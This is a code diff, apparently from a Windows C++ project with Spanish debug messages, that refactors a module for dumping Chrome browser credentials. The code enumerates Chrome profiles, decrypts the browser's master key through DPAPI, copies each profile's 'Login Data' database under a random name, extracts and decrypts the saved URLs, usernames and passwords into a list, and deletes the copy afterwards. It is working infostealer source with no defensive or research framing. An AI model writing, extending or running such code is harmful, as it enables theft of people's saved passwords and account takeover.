@@ -1,23 +1,7 @@
 #include "mod_info.hpp"
 #include "misc.hpp"
 
-static int callback(void* NotUsed, int argc, char** argv, char** azColName)
-{
-	int i;
-	for (i = 0; i < argc; i++)
-	{
-		printf("%s = %s\n", azColName[i], argv[i] ? argv[i] : "NULL");
-	}
-	printf("\n");
-	return 0;
-}
-
 void mod_Info::test_Data() {
-	//std::cout << "USUARIOS:\n";
-	//for (std::string user : this->m_Usuarios()) {
-	//	std::cout << user << "\n";
-	//}
-	//
 	std::cout << "CHROME PROFILES DUMP_TEST:\n";
 	for (Chrome_Profile profile : this->m_ChromeProfiles()) {
 		//std::cout << "\nPATH: " << profile.strPath << "\n";
@@ -27,7 +11,13 @@ void mod_Info::test_Data() {
 		std::cout << "SHORTCUT_NAME: " << profile.strShortCutName << "\n";
 		std::cout << "USERNAME: " << profile.strUserName << "\n";
 		std::cout << "HOSTED_DOMAIN: " << profile.strHostedDomain << "\nPASSWORDS FOR THIS PROFILE:\n";
-		this->test_SimplePassDump(Login_Path);
+		profile.strPath += "Login Data";
+		for (Chrome_Login_Data data : this->m_ProfilePasswords(profile.strPath)) {
+			std::cout << "URL: " << data.strUrl << "\n";
+			std::cout << "Action: " << data.strAction<< "\n";
+			std::cout << "User: " << data.strUser<< "\n";
+			std::cout << "Pass: " << data.strPassword<< "\n";
+		}
 	}
 
 }
@@ -115,7 +105,7 @@ std::string mod_Info::m_DecryptLogin(const std::string& strPass) {
 	return strOut;
 }
 
-std::string mod_Info::m_Decrypt(const std::string& strPass) {
+std::string mod_Info::m_DecryptMasterKey(const std::string& strPass) {
 	DATA_BLOB encryptedPass, decryptedPass;
 	std::string strOut = "";
 
@@ -140,85 +130,9 @@ std::string mod_Info::m_Decrypt(const std::string& strPass) {
 		strOut = reinterpret_cast<const char*>(decryptedPass.pbData);
 	}
 	
-	free(encryptedPass.pbData);
-	encryptedPass.pbData = NULL;
+	free(encryptedPass.pbData); encryptedPass.pbData = NULL;
 
 	return strOut;
-}
-
-void mod_Info::test_SimplePassDump(const std::string& strUserPath) {
-	std::string randomR = RandomID(6);
-	if (::CopyFileA((LPCSTR)strUserPath.c_str(), (LPCSTR)randomR.c_str(), FALSE)) {
-		sqlite3* db;
-		
-		int iRet = sqlite3_open(randomR.c_str(), &db);
-
-		if (iRet == SQLITE_OK) {
-			const char* cQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins;";
-			sqlite3_stmt* pStmt;
-
-			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
-			if (iRet == SQLITE_OK) {
-				iRet = sqlite3_step(pStmt);
-				while (iRet == SQLITE_ROW) {
-					if (sqlite3_column_bytes(pStmt, 3) > 0 && sqlite3_column_bytes(pStmt, 2) > 0) {
-						std::cout << "O_URL: " << sqlite3_column_text(pStmt, 0) << "\n";
-						std::cout << "A_URL: " << sqlite3_column_text(pStmt, 1) << "\n";
-						std::cout << "USER: " << sqlite3_column_text(pStmt, 2) << "\n";
-						std::string temp_Pass = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 3));
-						std::cout << "PASS: " <<this->m_DecryptLogin(temp_Pass) << "\n";
-					}
-					iRet = sqlite3_step(pStmt);
-				}
-			}
-			sqlite3_finalize(pStmt);
-		}
-
-		
-		sqlite3_close(db);
-
-		DeleteFile((LPCSTR)randomR.c_str());
-	}else {
-		std::cout << "No se puco copiar la bd del usuario: " << GetLastError() << "\n";
-	}
-}
-
-void mod_Info::test_SQL(){
-	sqlite3* db;
-	char* zErrMsg = 0;
-	
-	int iRet = sqlite3_open("archivo.sqlite", &db);
-
-	if (iRet != SQLITE_OK) {
-		std::cout << "No se pudo abrir el archivo\n";
-		sqlite3_close(db);
-		return;
-	}
-
-	const char* cQuery = "SELECT * FROM usuarios;";
-	//iRet = sqlite3_exec(db, cQuery, callback, 0, &zErrMsg);
-
-	sqlite3_stmt* pStmt;
-
-	iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
-
-	if (iRet != SQLITE_OK) {
-		std::cout << "SQL error: " << zErrMsg << "\n";
-		sqlite3_free(zErrMsg);
-	}else {
-		iRet = sqlite3_step(pStmt);
-		while (iRet == SQLITE_ROW) {
-			std::cout << "NOMBRE: " << sqlite3_column_text(pStmt, 0) << " - ";
-			std::cout << "EMAIL: " << sqlite3_column_text(pStmt, 1) << " - ";
-			std::cout << "PASSWORD: " << sqlite3_column_text(pStmt, 2) << " \n";
-			iRet = sqlite3_step(pStmt);
-		}
-
-		sqlite3_finalize(pStmt);
-	}
-
-	sqlite3_close(db);
-
 }
 
 std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
@@ -280,13 +194,56 @@ std::vector<Chrome_Profile> mod_Info::m_ChromeProfiles() {
 			//Encrypted key
 			std::string strTmp = base64_decode(jeyson["os_crypt"]["encrypted_key"]);
 			strTmp = strTmp.substr(5, strTmp.size() - 5);
-			strTmp = this->m_Decrypt(strTmp);
+			strTmp = this->m_DecryptMasterKey(strTmp);
 			this->vcChromeKey.resize(strTmp.size());
 			memcpy(this->vcChromeKey.data(), strTmp.data(), strTmp.size());
 		}
 	}
 
 	DeleteFile("saramambichi");
+
+	return vcOut;
+}
+
+std::vector<Chrome_Login_Data> mod_Info::m_ProfilePasswords(const std::string& strUserPath) {
+	std::vector<Chrome_Login_Data> vcOut;
+	std::string randomR = RandomID(6);
+	if (::CopyFileA((LPCSTR)strUserPath.c_str(), (LPCSTR)randomR.c_str(), FALSE)) {
+		sqlite3* db;
+
+		int iRet = sqlite3_open(randomR.c_str(), &db);
+
+		if (iRet == SQLITE_OK) {
+			const char* cQuery = "SELECT origin_url, action_url, username_value, password_value FROM logins;";
+			sqlite3_stmt* pStmt;
+
+			iRet = sqlite3_prepare(db, cQuery, -1, &pStmt, 0);
+			if (iRet == SQLITE_OK) {
+				iRet = sqlite3_step(pStmt);
+				while (iRet == SQLITE_ROW) {
+					if (sqlite3_column_bytes(pStmt, 3) > 0 && sqlite3_column_bytes(pStmt, 2) > 0) {
+						Chrome_Login_Data nPassword;
+						nPassword.strUrl = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 0));
+						nPassword.strAction = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 1));
+						nPassword.strUser = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 2));
+						std::string temp_Pass = reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 3));
+						nPassword.strPassword = this->m_DecryptLogin(temp_Pass);
+						vcOut.push_back(nPassword);
+					}
+					iRet = sqlite3_step(pStmt);
+				}
+			}
+			sqlite3_finalize(pStmt);
+		}
+
+
+		sqlite3_close(db);
+
+		DeleteFile((LPCSTR)randomR.c_str());
+	}else {
+		__DBG_("No se puco copiar la bd del usuario ");
+		__DBG_(GetLastError());
+	}
 
 	return vcOut;
 }
